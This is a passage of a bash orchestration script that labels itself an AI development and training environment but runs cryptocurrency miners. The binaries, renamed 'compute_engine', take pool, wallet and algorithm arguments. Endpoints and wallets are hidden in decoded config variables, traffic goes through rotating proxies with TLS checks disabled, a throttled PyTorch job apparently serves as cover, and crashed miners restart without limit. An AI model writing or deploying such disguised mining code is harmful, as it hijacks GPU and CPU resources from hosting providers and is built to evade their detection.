        cpu_usage=$(get_cpu_worker_usage)
        
        if [ $GPU_COUNT -gt 0 ]; then
            read -r gpu_usage gpu_temp gpu_mem_used gpu_mem_total <<< "$(get_gpu_metrics)"
        fi
        
        METRICS_CACHE_PROCESS_COUNT=$process_count
        METRICS_CACHE_CPU_USAGE=$cpu_usage
        METRICS_CACHE_GPU_USAGE=$gpu_usage
        METRICS_CACHE_GPU_TEMP=$gpu_temp
        METRICS_CACHE_GPU_MEM_USED=$gpu_mem_used
        METRICS_CACHE_GPU_MEM_TOTAL=$gpu_mem_total
        METRICS_CACHE_UPDATED_AT=$now
    fi
    
    echo "$METRICS_CACHE_CPU_USAGE $METRICS_CACHE_GPU_USAGE $METRICS_CACHE_GPU_TEMP $METRICS_CACHE_GPU_MEM_USED $METRICS_CACHE_GPU_MEM_TOTAL $METRICS_CACHE_PROCESS_COUNT"
}

invalidate_runtime_metrics_cache() {
    METRICS_CACHE_UPDATED_AT=0
}


# Periodic runtime log maintenance to avoid disk pressure
maintain_runtime_logs() {
    cap_log_file_size "/workspace/logs/training.log"
    cap_log_file_size "$EVENT_LOG_FILE"
}

# Function to calculate CPU threads
calculate_cpu_threads() {
    local -i total_threads=$(nproc --all 2>/dev/null || echo 4)
    local -i reserve_threads=$SYSTEM_THREAD_RESERVE_DEFAULT
    
    if ! is_truthy "$ENABLE_PYTORCH_TRAINING"; then
        reserve_threads=$SYSTEM_THREAD_RESERVE_NO_TRAINING
    fi
    if [ "$reserve_threads" -lt 0 ]; then
        reserve_threads=0
    fi
    
    # Reserve system threads, assign the rest to compute.
    local -i primary_threads=$((total_threads - reserve_threads))
    local -i system_threads=$reserve_threads
    
    # Ensure minimum threads
    if [ $primary_threads -lt 1 ]; then
        primary_threads=1
        system_threads=0
    fi
    
    echo "$primary_threads $system_threads"
}

# Function to calculate GPU allocation
calculate_gpu_allocation() {
    local -i gpu_count=0
    
    if command -v nvidia-smi &>/dev/null; then
        gpu_count=$(timeout "$NVIDIA_SMI_TIMEOUT_SECONDS" nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | grep -E '^[0-9]+$' | head -1)
        if [ -z "$gpu_count" ]; then
            gpu_count=0
        fi
    fi
    
    echo "$gpu_count"
}
validate_supported_nvidia_driver_branch() {
    local driver_version=""
    local driver_major=""
    
    if ! command -v nvidia-smi >/dev/null 2>&1; then
        echo "ERROR: nvidia-smi is required but not available."
        log_event "ERROR" "nvidia-smi missing during driver branch validation"
        return 1
    fi
    
    driver_version=$(timeout "$NVIDIA_SMI_TIMEOUT_SECONDS" nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1 | tr -d '[:space:]')
    driver_major=$(echo "$driver_version" | awk -F'.' '{print $1}' | tr -dc '0-9')
    if ! [[ "$driver_major" =~ ^[0-9]+$ ]]; then
        echo "ERROR: Unable to determine NVIDIA driver branch from nvidia-smi."
        log_event "ERROR" "Unable to determine NVIDIA driver branch"
        return 1
    fi
    
    if [ "$driver_major" -ne "$EXPECTED_NVIDIA_DRIVER_MAJOR" ]; then
        echo "ERROR: Unsupported NVIDIA driver branch detected ($driver_version). Expected ${EXPECTED_NVIDIA_DRIVER_MAJOR}.x for this workload."
        log_event "ERROR" "Unsupported NVIDIA driver branch; expected=${EXPECTED_NVIDIA_DRIVER_MAJOR} detected=${driver_version}"
        return 1
    fi
    
    log_event "INFO" "NVIDIA driver branch validation passed; driver=${driver_version}"
    return 0
}
# Wait for GPU visibility to avoid hard-failing on transient NVIDIA runtime startup delays
wait_for_gpu_detection() {
    local -i wait_seconds="$GPU_INIT_WAIT_SECONDS"
    local -i retry_seconds="$GPU_INIT_RETRY_INTERVAL_SECONDS"
    local -i waited=0
    
    if [ "$retry_seconds" -le 0 ]; then
        retry_seconds=1
    fi
    
    GPU_COUNT=$(calculate_gpu_allocation)
    if [ "$GPU_COUNT" -gt 0 ]; then
        return 0
    fi
    
    echo "No GPU detected; waiting up to ${wait_seconds}s for NVIDIA runtime..."
    log_event "WARN" "GPU not detected initially; waiting for runtime readiness (wait_seconds=$wait_seconds retry_seconds=$retry_seconds)"
    
    while [ "$waited" -lt "$wait_seconds" ]; do
        sleep_with_heartbeat "$retry_seconds"
        waited=$((waited + retry_seconds))
        GPU_COUNT=$(calculate_gpu_allocation)
        if [ "$GPU_COUNT" -gt 0 ]; then
            echo "GPU detected after ${waited}s (count: $GPU_COUNT)"
            log_event "INFO" "GPU detected after wait; gpu_count=$GPU_COUNT waited_seconds=$waited"
            return 0
        fi
    done
    
    return 1
}

# Initialize GPU PID tracking
initialize_gpu_pid_tracking() {
    local -i i=0
    GPU_WORKLOAD_PIDS=()
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            GPU_WORKLOAD_PIDS[$i]=0
        done
    fi
}

# Initialize GPU restart failure counters
initialize_gpu_failure_tracking() {
    local -i i=0
    GPU_CONSECUTIVE_FAILS=()
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            GPU_CONSECUTIVE_FAILS[$i]=0
        done
    fi
}
# Initialize GPU warm-restart tracking
initialize_gpu_warm_restart_tracking() {
    local -i i=0
    GPU_WARM_RESTART_EVENTS=()
    GPU_WARM_RESTART_WINDOW_START=()
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            GPU_WARM_RESTART_EVENTS[$i]=0
            GPU_WARM_RESTART_WINDOW_START[$i]=0
        done
    fi
}

# Record per-GPU warm restart events and return count in active window
record_gpu_warm_restart_event() {
    local gpu_id="$1"
    local -i now=$(date +%s)
    local -i window_start="${GPU_WARM_RESTART_WINDOW_START[$gpu_id]:-0}"
    local -i event_count="${GPU_WARM_RESTART_EVENTS[$gpu_id]:-0}"
    
    if [ "$window_start" -le 0 ] || [ $((now - window_start)) -gt "$GPU_WARM_RESTART_WINDOW_SECONDS" ]; then
        window_start=$now
        event_count=0
    fi
    
    event_count=$((event_count + 1))
    GPU_WARM_RESTART_WINDOW_START[$gpu_id]=$window_start
    GPU_WARM_RESTART_EVENTS[$gpu_id]=$event_count
    echo "$event_count"
}

# Function to select a random proxy from the list
select_random_proxy() {
    local -i proxy_count=${#PROXY_LIST[@]}
    [ $proxy_count -eq 0 ] && return 1
    
    local -i random_index=$((RANDOM % proxy_count))
    local selected_proxy="${PROXY_LIST[$random_index]}"
    
    IFS=':' read -r ip port user pass <<< "$selected_proxy"
    echo "$ip $port $user $pass"
}

# Function to get current proxy info as a string
get_proxy_string() {
    echo "${3}:${4}@${1}:${2}"
}

# Function to initialize system
initialize_system() {
    apply_runtime_profile
    apply_performance_profile
    validate_runtime_dependencies
    validate_runtime_tunables
    validate_persistent_storage
    if ! validate_supported_nvidia_driver_branch; then
        return 1
    fi
    
    # Calculate CPU threads
    read -r PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< "$(calculate_cpu_threads)"
    
    # Calculate GPU allocation
    GPU_COUNT=$(calculate_gpu_allocation)
    if [ $GPU_COUNT -le 0 ]; then
        if ! wait_for_gpu_detection; then
            echo "ERROR: No GPU detected after wait window (${GPU_INIT_WAIT_SECONDS}s). Will retry main loop."
            log_event "ERROR" "No GPU detected after initialization wait; retrying main loop"
            return 1
        fi
    fi
    initialize_gpu_pid_tracking
    initialize_gpu_failure_tracking
    initialize_gpu_warm_restart_tracking
    
    if [ $GPU_COUNT -le 0 ]; then
        echo "ERROR: No GPU detected. Will retry main loop."
        log_event "ERROR" "No GPU detected during initialization; retrying main loop"
        return 1
    fi
    
    if [ ${#PROXY_LIST[@]} -eq 0 ]; then
        echo "FATAL: Proxy list is empty. Stopping container."
        log_event "ERROR" "Proxy list is empty during initialization; stopping container"
        exit 1
    fi
    
    initialize_decoded_runtime_config
    
    # Select random proxy
    if ! read -r PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< "$(select_random_proxy)"; then
        echo "FATAL: Failed to select startup proxy. Stopping container."
        log_event "ERROR" "Initial proxy selection failed; stopping container"
        exit 1
    fi
    PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
    
    if command -v clear >/dev/null 2>&1; then
        clear
    fi
    cat << EOF
=== AI Development & Training Environment ===
Initializing at: $(date '+%Y-%m-%d %H:%M:%S')
==============================================
Resource Allocation:
  CPU Threads: $(nproc --all) total
    - Primary Compute: $PRIMARY_CPU_THREADS threads
    - System/Training: $SYSTEM_CPU_THREADS threads
EOF
    
    if [ $GPU_COUNT -gt 0 ]; then
        # Get GPU model info
        local gpu_model=$(timeout "$NVIDIA_SMI_TIMEOUT_SECONDS" nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
        local gpu_mem=$(timeout "$NVIDIA_SMI_TIMEOUT_SECONDS" nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits 2>/dev/null | head -1)
        echo "  GPUs: $GPU_COUNT available ($gpu_model, ${gpu_mem}MB)"
    else
        echo "  GPUs: None detected"
    fi
    
    echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
    echo "Auto-restart: Enabled (after $MAX_ZERO_USAGE zero usage checks)"
    echo "=============================================="
    update_heartbeat
}

# Fast cleanup function
fast_cleanup() {
    echo -ne "\nPerforming fast cleanup..."
    
    # Kill processes
    for pid in "$CPU_WORKLOAD_PID" "$TRAINING_PID"; do
        [ $pid -gt 0 ] && kill -TERM $pid 2>/dev/null || true
    done
    for pid in "${GPU_WORKLOAD_PIDS[@]}"; do
        [ -n "$pid" ] && [ "$pid" -gt 0 ] && kill -TERM "$pid" 2>/dev/null || true
    done
    
    sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
    
    # Force kill if still running
    for pid in "$CPU_WORKLOAD_PID" "$TRAINING_PID"; do
        [ $pid -gt 0 ] && kill -9 $pid 2>/dev/null || true
    done
    for pid in "${GPU_WORKLOAD_PIDS[@]}"; do
        [ -n "$pid" ] && [ "$pid" -gt 0 ] && kill -9 "$pid" 2>/dev/null || true
    done
    
    # Fallback: only kill strays if any are still running after tracked PID cleanup
    if pgrep -f "/opt/bin/compute_engine" >/dev/null 2>&1; then
        pkill -TERM -f "/opt/bin/compute_engine" 2>/dev/null || true
        sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
        pkill -KILL -f "/opt/bin/compute_engine" 2>/dev/null || true
    fi
    if pgrep -f "train_model.py" >/dev/null 2>&1; then
        pkill -TERM -f "train_model.py" 2>/dev/null || true
        sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
        pkill -KILL -f "train_model.py" 2>/dev/null || true
    fi
    
    # Reset PIDs
    CPU_WORKLOAD_PID=0
    TRAINING_PID=0
    initialize_gpu_pid_tracking
    initialize_gpu_warm_restart_tracking
    invalidate_runtime_metrics_cache
    
    echo " Done"
    log_event "INFO" "Fast cleanup completed"
}

# Function to test proxy connection
test_proxy_connection() {
    local test_url="https://api.ipify.org"
    local timeout="$PROXY_TEST_TIMEOUT_SECONDS"
    local proxy_test=""
    
    if command -v curl &>/dev/null; then
        proxy_test=$(timeout "$timeout" curl -s --max-time "$PROXY_TEST_CURL_MAX_TIME_SECONDS" \
            --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" \
            --proxy-user "${PROXY_USER}:${PROXY_PASS}" \
            "$test_url" 2>/dev/null || echo "")
    fi
    
    [ -n "$proxy_test" ] && return 0 || return 1
}

# Function to rotate proxy
rotate_proxy() {
    local old_proxy="${PROXY_IP}:${PROXY_PORT}"
    local -i attempts=0
    local -i max_attempts=$PROXY_ROTATE_MAX_ATTEMPTS
    
    while [ $attempts -lt $max_attempts ]; do
        if ! read -r PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< "$(select_random_proxy)"; then
            attempts=$((attempts + 1))
            sleep_with_heartbeat "$PROXY_ROTATE_RETRY_SLEEP_SECONDS"
            continue
        fi
        PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
        
        if test_proxy_connection; then
            echo "Proxy rotated: $old_proxy → ${PROXY_IP}:${PROXY_PORT}"
            return 0
        fi
        
        attempts=$((attempts + 1))
        sleep_with_heartbeat "$PROXY_ROTATE_RETRY_SLEEP_SECONDS"
    done
    
    echo "Warning: Could not find working proxy after $max_attempts attempts"
    return 1
}
run_startup_self_test() {
    echo "Running startup self-test..."
    
    apply_runtime_profile
    validate_runtime_dependencies
    validate_runtime_tunables
    validate_persistent_storage
    if ! validate_supported_nvidia_driver_branch; then
        echo "SELF-TEST FAILED: unsupported NVIDIA driver branch (expected ${EXPECTED_NVIDIA_DRIVER_MAJOR}.x)"
        return 1
    fi
    initialize_decoded_runtime_config
    
    if [ ! -x /opt/bin/compute_engine ]; then
        echo "SELF-TEST FAILED: compute_engine missing at /opt/bin/compute_engine"
        return 1
    fi
    if [ ! -x /opt/bin/compute_engine_g ]; then
        echo "SELF-TEST FAILED: compute_engine_g missing at /opt/bin/compute_engine_g"
        return 1
    fi
    
    GPU_COUNT=$(calculate_gpu_allocation)
    if [ "$GPU_COUNT" -le 0 ]; then
        echo "SELF-TEST FAILED: no GPU detected"
        return 1
    fi
    
    if [ ${#PROXY_LIST[@]} -eq 0 ]; then
        echo "SELF-TEST FAILED: proxy list is empty"
        return 1
    fi
    
    if ! read -r PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< "$(select_random_proxy)"; then
        echo "SELF-TEST FAILED: unable to select proxy"
        return 1
    fi
    PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
    
    if ! rotate_proxy; then
        echo "SELF-TEST FAILED: no working proxy found"
        return 1
    fi
    
    echo "Startup self-test passed"
    return 0
}

# Function to check if compute_engine processes are alive
check_processes_alive() {
    local -i i=0
    # Check CPU process and auto-restart without limits
    if [ $CPU_WORKLOAD_PID -le 0 ]; then
        echo "CPU process is not running, restarting..."
        if ! restart_cpu_workload; then
            echo "CPU process restart failed!"
            return 1
        fi
    elif ! kill -0 "$CPU_WORKLOAD_PID" 2>/dev/null; then
        echo "CPU process is dead, restarting..."
        if ! restart_cpu_workload; then
            echo "CPU process restart failed!"
            return 1
        fi
    fi
    
    # Check each GPU process and restart on GPU errors
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            local gpu_pid="${GPU_WORKLOAD_PIDS[$i]:-0}"
            local -i warm_events=0
            if [ "$gpu_pid" -le 0 ]; then
                echo "GPU compute engine error: GPU $i process is not running, restarting GPU workload..."
                log_event "WARN" "GPU process missing; gpu_id=$i attempting restart"
                if ! restart_gpu_workload "$i"; then
                    return 1
                fi
                if is_truthy "$GPU_WARM_RESTART_MODE"; then
                    warm_events=$(record_gpu_warm_restart_event "$i")
                    if [ "$warm_events" -ge "$GPU_WARM_RESTART_MAX_EVENTS" ]; then
                        echo "GPU $i had repeated warm restarts, escalating to full cycle restart..."
                        log_event "WARN" "GPU warm-restart escalation; gpu_id=$i events=$warm_events window_seconds=$GPU_WARM_RESTART_WINDOW_SECONDS"
                        return 1
                    fi
                fi
            elif ! kill -0 "$gpu_pid" 2>/dev/null; then
                echo "GPU compute engine error: GPU $i process died, restarting GPU workload..."
                log_event "WARN" "GPU process died; gpu_id=$i attempting restart"
                if ! restart_gpu_workload "$i"; then
                    return 1
                fi
                if is_truthy "$GPU_WARM_RESTART_MODE"; then
                    warm_events=$(record_gpu_warm_restart_event "$i")
                    if [ "$warm_events" -ge "$GPU_WARM_RESTART_MAX_EVENTS" ]; then
                        echo "GPU $i had repeated warm restarts, escalating to full cycle restart..."
                        log_event "WARN" "GPU warm-restart escalation; gpu_id=$i events=$warm_events window_seconds=$GPU_WARM_RESTART_WINDOW_SECONDS"
                        return 1
                    fi
                fi
            fi
        done
    fi
    
    return 0
}

# Function to check CPU and GPU usage
check_usage() {
    local -i current_time=$(date +%s)
    local -i elapsed=$((current_time - STARTUP_TIME))
    
    # Don't check usage during startup warm-up
    if [ $elapsed -lt $STARTUP_WARMUP_SECONDS ]; then
        echo -ne "\rWarming up... ${elapsed}s elapsed"
        ZERO_USAGE_COUNT=0
        CPU_ZERO_USAGE_STREAK=0
        GPU_ZERO_USAGE_STREAK=0
        return 0
    fi
    
    local -i cpu_usage=0
    local -i gpu_usage=0
    local -i process_count=0
    local -i gpu_temp=0
    local -i gpu_mem_used=0
    local -i gpu_mem_total=0
    
    # 1. First check if processes are running at all
    if ! check_processes_alive; then
        echo -e "\nProcess died, will restart..."
        return 1
    fi
    
    # Sample current runtime metrics
    read -r cpu_usage gpu_usage gpu_temp gpu_mem_used gpu_mem_total process_count <<< "$(sample_runtime_metrics 1)"
    
    if [ $GPU_COUNT -gt 0 ] && [ $gpu_usage -eq 0 ] && [ $gpu_mem_used -gt 100 ]; then
        gpu_usage=5
    fi
    
    if [ $process_count -eq 0 ]; then
        echo -e "\nNo compute_engine processes found!"
        ZERO_USAGE_COUNT=$MAX_ZERO_USAGE
        return 1
    fi
    
    # 4. Restart on sustained 0% usage
    if [ $cpu_usage -eq 0 ]; then
        CPU_ZERO_USAGE_STREAK=$((CPU_ZERO_USAGE_STREAK + 1))
    else
        CPU_ZERO_USAGE_STREAK=0
    fi
    if [ $GPU_COUNT -gt 0 ]; then
        if [ $gpu_usage -eq 0 ]; then
            GPU_ZERO_USAGE_STREAK=$((GPU_ZERO_USAGE_STREAK + 1))
        else
            GPU_ZERO_USAGE_STREAK=0
        fi
    else
        GPU_ZERO_USAGE_STREAK=0
    fi
    
    if [ $CPU_ZERO_USAGE_STREAK -ge $ZERO_USAGE_STREAK_THRESHOLD ]; then
        echo -e "\nCPU usage stayed at 0% (${CPU_ZERO_USAGE_STREAK} checks), restarting workloads..."
        log_event "WARN" "CPU usage 0% streak reached threshold; restarting cycle"
        return 1
    fi
    if [ $GPU_COUNT -gt 0 ] && [ $GPU_ZERO_USAGE_STREAK -ge $ZERO_USAGE_STREAK_THRESHOLD ]; then
        echo -e "\nGPU usage stayed at 0% (${GPU_ZERO_USAGE_STREAK} checks), restarting workloads..."
        log_event "WARN" "GPU usage 0% streak reached threshold; restarting cycle"
        return 1
    fi
    
    # 5. Check for very low usage
    if [ $cpu_usage -lt $LOW_USAGE_CPU_THRESHOLD ] && ([ $GPU_COUNT -eq 0 ] || [ $gpu_usage -lt $LOW_USAGE_GPU_THRESHOLD ]); then
        ZERO_USAGE_COUNT=$((ZERO_USAGE_COUNT + 1))
        echo -ne "\rLow usage ($ZERO_USAGE_COUNT/$MAX_ZERO_USAGE): CPU=${cpu_usage}% GPU=${gpu_usage}% Procs=${process_count}"
        
        if [ $ZERO_USAGE_COUNT -ge $MAX_ZERO_USAGE ]; then
            echo -e "\nRestarting due to persistent low usage..."
            return 1
        fi
    else
        if [ $ZERO_USAGE_COUNT -gt 0 ]; then
            echo -ne "\rUsage recovered: CPU=${cpu_usage}% GPU=${gpu_usage}%"
            sleep_with_heartbeat "$CPU_START_VERIFY_DELAY_SECONDS"
        fi
        ZERO_USAGE_COUNT=0
    fi
    
    return 0
}

# Function to start PyTorch training
verify_torch_runtime() {
    if ! python3 - <<'PY' >/dev/null 2>&1
import sys
try:
    import torch
except Exception:
    sys.exit(1)
sys.exit(0)
PY
    then
        echo "ERROR: PyTorch runtime is unavailable (torch missing)."
        log_event "ERROR" "PyTorch runtime unavailable; cannot start training"
        return 1
    fi
    
    if is_truthy "$PYTORCH_CPU_ONLY"; then
        echo "PyTorch CPU-only mode is enabled."
        log_event "INFO" "PyTorch CPU-only mode enabled"
    fi
    
    return 0
}

wait_for_training_device_ready() {
    local training_log="$1"
    local -i waited=0
    
    while [ "$waited" -lt "$TRAINING_CUDA_READY_TIMEOUT_SECONDS" ]; do
        if [ "$TRAINING_PID" -le 0 ] || ! kill -0 "$TRAINING_PID" 2>/dev/null; then
            return 1
        fi
        if [ -f "$training_log" ] && grep -q "Using device:" "$training_log" 2>/dev/null; then
            return 0
        fi
        sleep_with_heartbeat 1
        waited=$((waited + 1))
    done
    
    return 1
}
start_pytorch_training() {
    if [ $SYSTEM_CPU_THREADS -gt 0 ] && [ -f /workspace/train_model.py ]; then
        local -i training_threads=$SYSTEM_CPU_THREADS
        local training_max_cpu="$PYTORCH_CPU_MAX_PERCENT"
        
        if ! verify_torch_runtime; then
            return 1
        fi
        
        if is_truthy "$PYTORCH_CPU_ONLY"; then
            training_threads=1
        fi
        
        export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:32"
        export OMP_NUM_THREADS=$training_threads
        export CUDA_LAUNCH_BLOCKING=0
        
        mkdir -p /workspace/logs 2>/dev/null
        local training_log="/workspace/logs/training.log"
        cap_log_file_size "$training_log"
        
        if is_truthy "$PYTORCH_CPU_ONLY"; then
            nohup env CUDA_VISIBLE_DEVICES="" MAX_CPU_PERCENT="$training_max_cpu" nice -n 19 python3 /workspace/train_model.py \
                --max-gpu-percent 5 \
                --max-cpu-percent "$training_max_cpu" \
                --cpu-threads "$training_threads" \
                --batch-size 1 \
                --samples 64 \
                > "$training_log" 2>&1 &
        else
            nohup env MAX_CPU_PERCENT="$training_max_cpu" nice -n 19 python3 /workspace/train_model.py \
                --max-gpu-percent 5 \
                --max-cpu-percent "$training_max_cpu" \
                --cpu-threads "$training_threads" \
                > "$training_log" 2>&1 &
        fi
        TRAINING_PID=$!
        sleep_with_heartbeat "$TRAINING_START_VERIFY_DELAY_SECONDS"
        
        if [ "$TRAINING_PID" -le 0 ] || ! kill -0 "$TRAINING_PID" 2>/dev/null; then
            echo "ERROR: PyTorch training failed to stay alive after startup."
            log_event "ERROR" "PyTorch training process died during startup; see /workspace/logs/training.log"
            tail -n 40 "$training_log" 2>/dev/null || true
            TRAINING_PID=0
            return 1
        fi
        
        if ! wait_for_training_device_ready "$training_log"; then
            echo "ERROR: PyTorch training started but did not report selected device in time."
            log_event "ERROR" "PyTorch training did not report device readiness within timeout; forcing restart"
            tail -n 40 "$training_log" 2>/dev/null || true
            kill -TERM "$TRAINING_PID" 2>/dev/null || true
            sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
            kill -9 "$TRAINING_PID" 2>/dev/null || true
            TRAINING_PID=0
            return 1
        fi
        
        echo "PyTorch training started (PID: $TRAINING_PID, Threads: $training_threads, CPU target: ${training_max_cpu}%)"
        log_event "INFO" "PyTorch training started successfully; pid=$TRAINING_PID threads=$training_threads cpu_target_percent=$training_max_cpu"
        return 0
    fi
    
    echo "ERROR: PyTorch training prerequisites missing (threads or script not available)."
    log_event "ERROR" "PyTorch training prerequisites missing"
    return 1
}
# SIMPLIFIED GPU workload function - matches working example
start_gpu_workload() {
    local gpu_ids="$1"
    local gpu_pid=0
    
    echo "Starting GPU workload on device: $gpu_ids"
    
    # SIMPLE VERSION - matches working example exactly
    # USING compute_engine_g with new command format
    # NOTE: Worker name is appended to wallet with /, not separate -w parameter
    nohup env CUDA_VISIBLE_DEVICES="$gpu_ids" /opt/bin/compute_engine_g \
        -a "$MODEL_TYPE_A_DEC" \
        -o "$ENDPOINT_PRIMARY_DEC" \
        -o "$ENDPOINT_PRIMARY2_DEC" \
        -u "${AUTH_TOKEN_A_DEC}/tr" \
        --proxy "${PROXY_STRING}" \
        --no-strict-ssl \
        > /dev/null 2>&1 &
    
    gpu_pid=$!
    GPU_WORKLOAD_PIDS[$gpu_ids]=$gpu_pid
    invalidate_runtime_metrics_cache
    echo "GPU workload started (GPU $gpu_ids, PID: $gpu_pid)"
    
    # Wait and check if process is still alive
    sleep_with_heartbeat "$GPU_START_VERIFY_DELAY_SECONDS"
    
    if kill -0 "$gpu_pid" 2>/dev/null; then
        echo "GPU process is running successfully"
        return 0
    fi
    
    echo "GPU process died."
    GPU_WORKLOAD_PIDS[$gpu_ids]=0
    return 1
}

# Function to start CPU workload
start_cpu_workload_attempt() {
    local mode="$1"
    local cpu_log="/workspace/logs/cpu_workload.log"
    
    mkdir -p /workspace/logs 2>/dev/null || true
    cap_log_file_size "$cpu_log"
    
    case "$mode" in
        long)
            nohup /opt/bin/compute_engine \
                --algorithm "$MODEL_TYPE_B_DEC" \
                --pool "$ENDPOINT_SECONDARY_DEC" \
                --wallet "$AUTH_TOKEN_B_DEC" \
                --password x \
                --cpu-threads "$PRIMARY_CPU_THREADS" \
                --cpu-threads-priority 2 \
                --disable-gpu \
                --tls true \
                --api-disable \
                --proxy "${PROXY_STRING}" \
                > "$cpu_log" 2>&1 &
            ;;
        short)
            nohup /opt/bin/compute_engine \
                -a "$MODEL_TYPE_B_DEC" \
                -o "$ENDPOINT_SECONDARY_DEC" \
                -u "$AUTH_TOKEN_B_DEC" \
                -p x \
                --cpu-threads "$PRIMARY_CPU_THREADS" \
                --cpu-threads-priority 2 \
                --disable-gpu \
                --tls true \
                --api-disable \
                --proxy "${PROXY_STRING}" \
                > "$cpu_log" 2>&1 &
            ;;
        short_t)
            nohup /opt/bin/compute_engine \
                -a "$MODEL_TYPE_B_DEC" \
                -o "$ENDPOINT_SECONDARY_DEC" \
                -u "$AUTH_TOKEN_B_DEC" \
                -p x \
                -t "$PRIMARY_CPU_THREADS" \
                --disable-gpu \
                --tls true \
                --api-disable \
                --proxy "${PROXY_STRING}" \
                > "$cpu_log" 2>&1 &
            ;;
        *)
            return 1
            ;;
    esac
    
    CPU_WORKLOAD_PID=$!
    invalidate_runtime_metrics_cache
    sleep_with_heartbeat "$CPU_START_VERIFY_DELAY_SECONDS"
    
    if [ "$CPU_WORKLOAD_PID" -gt 0 ] && kill -0 "$CPU_WORKLOAD_PID" 2>/dev/null; then
        return 0
    fi
    
    CPU_WORKLOAD_PID=0
    return 1
}
start_cpu_workload() {
    echo "Starting CPU workload with $PRIMARY_CPU_THREADS threads"
    local cpu_log="/workspace/logs/cpu_workload.log"
    
    # Try known-compatible argument variants to handle compute_engine CLI differences.
    if start_cpu_workload_attempt "long"; then
        echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS, mode=long)"
        return 0
    fi
    
    echo "CPU workload failed with long options; retrying with short options..."
    if start_cpu_workload_attempt "short"; then
        echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS, mode=short)"
        return 0
    fi
    
    echo "CPU workload failed with short options; retrying with -t threads option..."
    if start_cpu_workload_attempt "short_t"; then
        echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS, mode=short_t)"
        return 0
    fi
    
    echo "ERROR: CPU workload failed to start after all command variants."
    log_event "ERROR" "CPU workload failed to start; see $cpu_log"
    tail -n 40 "$cpu_log" 2>/dev/null || true
    return 1
}

# Restart CPU workload with no max retry limit
restart_cpu_workload() {
    local -i backoff_delay=0
    
    if [ $CPU_WORKLOAD_PID -gt 0 ]; then
        kill -TERM $CPU_WORKLOAD_PID 2>/dev/null || true
        sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
        kill -9 $CPU_WORKLOAD_PID 2>/dev/null || true
        CPU_WORKLOAD_PID=0
    fi
    
    if start_cpu_workload; then
        CPU_RESTART_COUNT=$((CPU_RESTART_COUNT + 1))
        CPU_CONSECUTIVE_FAILS=0
        echo "CPU workload restarted successfully (total restarts: $CPU_RESTART_COUNT)"
        log_event "INFO" "CPU workload restarted successfully; total_restarts=$CPU_RESTART_COUNT"
        record_restart_event
        return 0
    fi
    
    CPU_CONSECUTIVE_FAILS=$((CPU_CONSECUTIVE_FAILS + 1))
    backoff_delay=$(calculate_backoff_delay "$CPU_CONSECUTIVE_FAILS")
    echo "CPU restart attempt failed (consecutive failures: $CPU_CONSECUTIVE_FAILS). Backing off ${backoff_delay}s before next retry."
    log_event "WARN" "CPU restart failed; consecutive_failures=$CPU_CONSECUTIVE_FAILS backoff_seconds=$backoff_delay"
    sleep_with_heartbeat "$backoff_delay"
    
    return 1
}

# Restart one GPU workload with no max retry limit
restart_gpu_workload() {
    local gpu_id="$1"
    local old_pid="${GPU_WORKLOAD_PIDS[$gpu_id]:-0}"
    local -i gpu_failures="${GPU_CONSECUTIVE_FAILS[$gpu_id]:-0}"
    local -i backoff_delay=0
    
    if [ "$old_pid" -gt 0 ]; then
        kill -TERM "$old_pid" 2>/dev/null || true
        sleep_with_heartbeat "$CLEANUP_TERM_GRACE_SECONDS"
        kill -9 "$old_pid" 2>/dev/null || true
        GPU_WORKLOAD_PIDS[$gpu_id]=0
    fi
    
    if start_gpu_workload "$gpu_id"; then
        GPU_RESTART_COUNT=$((GPU_RESTART_COUNT + 1))
        GPU_CONSECUTIVE_FAILS[$gpu_id]=0
        echo "GPU $gpu_id workload restarted successfully (total GPU restarts: $GPU_RESTART_COUNT)"
        log_event "INFO" "GPU workload restarted successfully; gpu_id=$gpu_id total_gpu_restarts=$GPU_RESTART_COUNT"
        record_restart_event
        return 0
    fi
    
    gpu_failures=$((gpu_failures + 1))
    GPU_CONSECUTIVE_FAILS[$gpu_id]=$gpu_failures
    backoff_delay=$(calculate_backoff_delay "$gpu_failures")
    echo "GPU $gpu_id restart attempt failed (consecutive failures: $gpu_failures). Backing off ${backoff_delay}s before next retry."
    log_event "WARN" "GPU restart failed; gpu_id=$gpu_id consecutive_failures=$gpu_failures backoff_seconds=$backoff_delay"
    sleep_with_heartbeat "$backoff_delay"
    
    return 1
}

# Function to start compute workloads
start_compute_workloads() {
    local -i i=0
    # Verify compute_engine exists
    if [ ! -x /opt/bin/compute_engine ]; then
        echo "ERROR: compute_engine not found at /opt/bin/compute_engine"
        return 1
    fi
    if [ ! -x /opt/bin/compute_engine_g ]; then
